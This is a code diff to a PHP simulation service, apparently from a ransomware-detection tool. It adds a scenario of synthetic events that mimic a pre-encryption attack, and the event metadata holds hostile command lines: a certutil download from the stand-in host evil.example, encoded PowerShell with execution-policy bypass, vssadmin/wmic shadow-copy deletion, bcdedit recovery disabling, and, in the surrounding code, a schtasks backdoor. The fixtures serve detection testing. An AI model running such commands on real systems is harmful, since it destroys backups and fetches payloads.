@@ -179,6 +179,13 @@ class SimulationService
                 'color'       => 'suspect',
                 'event_count' => 5,
             ],
+            'shadow_copy_attack' => [
+                'label'       => 'Sabotage sauvegardes + LOLBins',
+                'description' => '8 événements : suppression des clichés VSS (vssadmin/wmic), LOLBins (certutil, PowerShell encodé), puis chiffrement. Phase pré-chiffrement.',
+                'icon'        => 'fa-eraser',
+                'color'       => 'critical',
+                'event_count' => 8,
+            ],
         ];
     }
 
@@ -197,6 +204,7 @@ class SimulationService
             'ransomware_full'     => $this->seqRansomwareFull($base),
             'exfiltration'        => $this->seqExfiltration($base),
             'suspicious_activity' => $this->seqSuspiciousActivity($base),
+            'shadow_copy_attack'  => $this->seqShadowCopyAttack($base),
             default               => throw new \InvalidArgumentException("Scénario inconnu : $scenario"),
         };
     }
@@ -345,6 +353,53 @@ class SimulationService
             ['event_type' => 'file_modified',               'path' => $p['sys']  . 'config' . DIRECTORY_SEPARATOR . 'Security', 'metadata' => ['target' => 'registry_hive']],
             ['event_type' => 'suspicious_process_detected', 'path' => $p['sys']  . 'schtasks.exe',      'metadata' => ['process_name' => 'schtasks.exe', 'args' => '/create /tn BackdoorTask /tr cmd.exe /sc onlogon', 'pid' => 3302]],
             ['event_type' => 'file_accessed',               'path' => $p['sys']  . 'SAM',               'metadata' => ['target' => 'credential_store']],
+        ];
+    }
+
+    // ─── Scénario 6 : Sabotage sauvegardes + LOLBins ─────────────────────────
+
+    private function seqShadowCopyAttack(array $p): array
+    {
+        return [
+            // 1 — LOLBin : téléchargement furtif du payload via certutil
+            ['event_type' => 'lolbins_abuse_detected', 'path' => 'process://5500', 'metadata' => [
+                'process_name' => 'certutil.exe',
+                'cmdline'      => ['certutil', '-urlcache', '-split', '-f', 'http://evil.example/payload.enc', 'C:\\Windows\\Temp\\payload.enc'],
+                'reason'       => 'Téléchargement de payload via certutil -urlcache (LOLBin).',
+            ]],
+            // 2 — LOLBin : exécution de commande PowerShell encodée
+            ['event_type' => 'lolbins_abuse_detected', 'path' => 'process://5501', 'metadata' => [
+                'process_name' => 'powershell.exe',
+                'cmdline'      => ['powershell', '-exec', 'bypass', '-encodedcommand', 'SQBuAHYAbwBrAGUA...'],
+                'reason'       => 'PowerShell -encodedcommand avec -exec bypass (contournement restrictions).',
+            ]],
+            // 3 — Suppression des clichés VSS via vssadmin
+            ['event_type' => 'shadow_copy_deletion_detected', 'path' => 'process://5502', 'metadata' => [
+                'process_name' => 'vssadmin.exe',
+                'cmdline'      => ['vssadmin', 'delete', 'shadows', '/all', '/quiet'],
+                'reason'       => 'Suppression de tous les clichés instantanés VSS.',
+            ]],
+            // 4 — Suppression via wmic (méthode alternative)
+            ['event_type' => 'shadow_copy_deletion_detected', 'path' => 'process://5503', 'metadata' => [
+                'process_name' => 'wmic.exe',
+                'cmdline'      => ['wmic', 'shadowcopy', 'delete'],
+                'reason'       => 'Suppression des shadow copies via wmic.',
+            ]],
+            // 5 — Désactivation de la récupération système
+            ['event_type' => 'shadow_copy_deletion_detected', 'path' => 'process://5504', 'metadata' => [
+                'process_name' => 'bcdedit.exe',
+                'cmdline'      => ['bcdedit', '/set', 'recoveryenabled', 'no'],
+                'reason'       => 'Désactivation de la récupération au démarrage.',
+            ]],
+            // 6 — Premier fichier chiffré
+            ['event_type' => 'file_encrypted_extension', 'path' => $p['docs'] . 'Rapport_Q4.xlsx.locked', 'file_extension' => 'locked'],
+            // 7 — Chiffrement en rafale
+            ['event_type' => 'mass_rename_detected', 'path' => $p['docs'], 'metadata' => [
+                'rename_count_30s' => 47,
+                'reason'           => 'Renommages massifs détectés après sabotage des sauvegardes.',
+            ]],
+            // 8 — Note de rançon déposée
+            ['event_type' => 'file_created', 'path' => $p['desktop'] . 'HOW_TO_RECOVER_FILES.txt', 'file_extension' => 'txt'],
         ];
     }
 
